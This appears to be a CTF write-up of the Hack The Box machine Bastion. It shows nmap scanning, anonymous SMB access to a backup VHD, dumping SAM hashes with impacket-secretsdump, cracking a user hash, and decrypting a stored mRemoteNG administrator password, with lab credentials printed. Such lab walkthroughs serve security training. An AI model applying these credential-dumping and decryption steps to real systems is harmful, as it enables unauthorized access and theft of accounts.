![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/71b37b2e-e90f-4252-8fef-451b2a940875)

first enumeration with nmap 

```shell
# Nmap 7.94 scan initiated Sun Jul 30 17:12:19 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,135,139,445,5985,47001 -Pn 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.18s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  Ö²pÓU      Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-30T18:12:38+02:00
| smb2-time: 
|   date: 2023-07-30T16:12:37
|_  start_date: 2023-07-30T16:03:20
|_clock-skew: mean: -39m57s, deviation: 1h09m13s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 30 17:12:46 2023 -- 1 IP address (1 host up) scanned in 27.69 seconds
```
cool let's enumerate smb 

### Enumerating SMB server 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/Basiton]
└─$ smbclient -L 10.10.10.134 -N            
                                                                              
        Sharename       Type      Comment
        ---------       ----      -------      
        ADMIN$          Disk      Remote Admin
        Backups         Disk                                                  
        C$              Disk      Default share                                                                                                             
        IPC$            IPC       Remote IPC         
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available                                                                                                       
```
first we check for anonymous available shares, we can see the Backups share 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b0e5bc5f-5a0a-4b6e-95e4-29904fdfdc5a)

mount the smbshare into our kali machine.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7cc247f6-68fd-4b8e-a1b5-9c1fb49f99e9)

checking the content of `note.txt` not much info, just talking about transfers of backups. let's look around.

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─$ ls -al
total 5330560
drwxr-xr-x 2 root root          0 Feb 22  2019 .
drwxr-xr-x 2 root root          0 Feb 22  2019 ..
-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root       1186 Feb 22  2019 BackupSpecs.xml
-rwxr-xr-x 1 root root       1078 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxr-xr-x 1 root root       8930 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
-rwxr-xr-x 1 root root       6542 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
-rwxr-xr-x 1 root root       2894 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
-rwxr-xr-x 1 root root       1488 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
-rwxr-xr-x 1 root root       1484 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
-rwxr-xr-x 1 root root       3844 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
-rwxr-xr-x 1 root root       3988 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
-rwxr-xr-x 1 root root       7110 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
-rwxr-xr-x 1 root root    2374620 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```
in the `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351` directory, we got some files in .`vhd` and `.xml` let's check online how to extract `.vhd` file. first we need to install:

```
apt-get install libguestfs-tools
apt-get install guestmount
```

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/Basiton]
└─$ sudo guestmount --add mnt/WindowsImageBackup/L4mpje-PC/"Backup 2019-02-22 124351"/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro mnt/vhd
[sudo] password for n16hth4wk:

┌──(root㉿n16hth4wk-sec)-[/home/…/HTB/Basiton/mnt/vhd]
└─# ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
```
cool we mount the vhd file and extracted it contents. checking around got nothing,

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6850ab55-8eb6-472e-881c-0f2f0278c3e9)

checking the `Windows/System32/config` for SAM and SYSTEM so we can get NTLM hashes from there. 

```shell
┌──(root㉿n16hth4wk-sec)-[/home/n16hth4wk/Documents/HTB/Basiton]
└─# impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```
cool we got the hashes for user `L4mpje`. let's crack it

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/faab337a-a188-4709-ba8d-8c85d04c505e)

cracked the hash using hashcat. we got `bureaulampje` as the password. let's try login ssh using `L4ampje:bureaulampje`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/095ff0b8-b5a8-4d18-acf2-eaf8985ccc04)

Bankai!!! we are in.


## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c839a253-1412-4091-ad2a-c57673e54cdc)

checking for installed applications, we can see `mRemoteNG`. let's try exploit this app.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7c380697-ec40-451e-ac9e-2ea27400a91b)

navigate to the appdata dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dceeebeb-0fe9-4304-9382-38280e7db4c2)

checking the content `confCons.xml` file we can see the administrator password enc text.

```
Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1b952d23-94b8-4fc8-aa9b-e87151a19b50)

found a decryptor tool to crack the enc text [Tool](git clone https://github.com/haseebT/mRemoteNG-Decrypt.git). 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/631e9da7-9c03-4705-bf1f-0406526e900f)

decrypted the password success. `thXLHM96BeKL0ER2`. let's try ssh as administrator using this password.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e71ddcb0-3dee-44f6-a1ba-b4672709da19)

and we are through 



